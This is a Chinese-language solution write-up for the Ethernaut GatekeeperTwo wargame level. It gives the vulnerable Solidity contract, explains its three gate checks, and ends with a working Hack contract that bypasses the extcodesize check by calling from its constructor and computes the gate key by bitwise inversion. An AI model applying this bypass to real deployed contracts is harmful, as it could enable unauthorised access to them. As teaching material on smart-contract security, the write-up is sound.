# Ethernaut 14-GatekeeperTwo

## 本关目标

- 成为 entrant

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    // msg.sender要和tx.orign不同
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    // 要求合约的调用者不能有代码
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    // 要求传入的_gateKey要和msg.sender的hash相反
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## 解决方案

1. 破解 gateOne， 只需要构造一个 Hack 合约，使用 Hack 合约调用 enter()
2. 破解 gateTwo， Hack 合约只能有 constructor，不能有其他代码
3. 破解 gateTheww，uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))取反即为\_gateKey

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IGateKeeperTwo {
    function entrant() external view returns (address);
    function enter(bytes8) external returns (bool);
}

contract Hack {
    constructor(IGateKeeperTwo target) {
       bytes8 key = bytes8(~uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        require(target.enter(key), "failed");
    }
}
```
